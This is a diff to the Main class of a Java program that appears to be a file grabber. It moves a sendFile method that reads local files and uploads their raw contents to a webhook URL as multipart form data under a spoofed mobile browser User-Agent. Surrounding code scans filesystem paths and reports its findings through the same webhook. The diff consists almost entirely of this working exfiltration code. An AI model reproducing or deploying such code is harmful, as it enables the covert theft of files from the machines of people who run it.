@@ -100,10 +100,47 @@ public class Main {
             } catch (IOException ex) {
                 ex.printStackTrace();
             }
-
         }
 
         sout += "message sent" + result + "\n";
+    }
+
+    private static void sendFile(File file) throws IOException {
+        /*byte[] fileContent = FileUtils.readFileToByteArray(new File(file.toPath().toString()));
+        String encodedString = Base64.getEncoder().encodeToString(fileContent);
+        sendMessage(encodedString);
+
+        int random = new Random().nextInt();
+        File textfile = new File("baseCode_" + random + ".txt");
+        PrintWriter baseCode = new PrintWriter(textfile);
+        baseCode.println(encodedString);
+        /* ^base64 code^
+        * https://www.baeldung.com/java-base64-image-string */
+
+        String boundary = Long.toHexString(System.currentTimeMillis());
+        URLConnection connection = new URL(webhookURL).openConnection();
+        connection.setDoOutput(true);
+        connection.setRequestProperty("User-Agent","Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
+        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+        try (PrintWriter writer = new PrintWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.US_ASCII))) {
+            writer.println("--" + boundary);
+            writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
+            writer.println("Content-Type: image/png");
+            byte[] fileContent = Files.readAllBytes(file.toPath());
+            writer.println(fileContent);
+            sout += fileContent + "\n";
+            //writer.println(textfile);
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.US_ASCII))) {
+                for (String line; (line = reader.readLine()) != null; ) {
+                    writer.println(line);
+                }
+            }
+            writer.println("--" + boundary + "--");
+        }
+
+        sout += "Connection? " + ((HttpURLConnection) connection).getResponseMessage() + "\n"
+                + "file sent\n";
+
     }
 
     private static void OSCapture(String userOS) throws InterruptedException {
@@ -150,56 +187,13 @@ public class Main {
                     }
 
                 } catch (Exception ignored) {
-                    webhooks.append("\n " + path + "/" + pathname + " NOT FOUND"); //occasional error: Server returned HTTP response code: 400 for URL:
+                    //webhooks.append("\n " + path + "/" + pathname + " NOT FOUND"); //occasional error: Server returned HTTP response code: 400 for URL:
                     TimeUnit.MILLISECONDS.sleep(100);
                 }
             }
         }
 
         sendMessage("```" + webhooks + "```");
-
-    }
-
-    private static void sendFile(File file) throws IOException {
-        /*byte[] fileContent = FileUtils.readFileToByteArray(new File(file.toPath().toString()));
-        String encodedString = Base64.getEncoder().encodeToString(fileContent);
-
-        sendMessage(encodedString);
-
-        int random = new Random().nextInt();
-        File textfile = new File("cached_" + random + ".txt");
-        PrintWriter baseCode = new PrintWriter(textfile);
-
-        baseCode.println(encodedString);
-        /* ^base64 code^
-        * https://www.baeldung.com/java-base64-image-string */
-
-        String boundary = Long.toHexString(System.currentTimeMillis());
-        URLConnection connection = new URL(webhookURL).openConnection();
-        connection.setDoOutput(true);
-        connection.setRequestProperty("User-Agent","Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
-        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-
-        try (PrintWriter writer = new PrintWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.US_ASCII))) {
-            writer.println("--" + boundary);
-            writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
-            writer.println("Content-Type: image/png");
-            byte[] fileContent = Files.readAllBytes(file.toPath());
-            writer.println(fileContent);
-            sout += fileContent + "\n";
-            //writer.println(textfile);
-
-            try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.US_ASCII))) {
-                for (String line; (line = reader.readLine()) != null; ) {
-                    writer.println(line);
-                }
-
-            }
-            writer.println("--" + boundary + "--");
-
-        }
-
-        sout += "Connection? " + ((HttpURLConnection) connection).getResponseMessage() + "\n";
 
     }
 
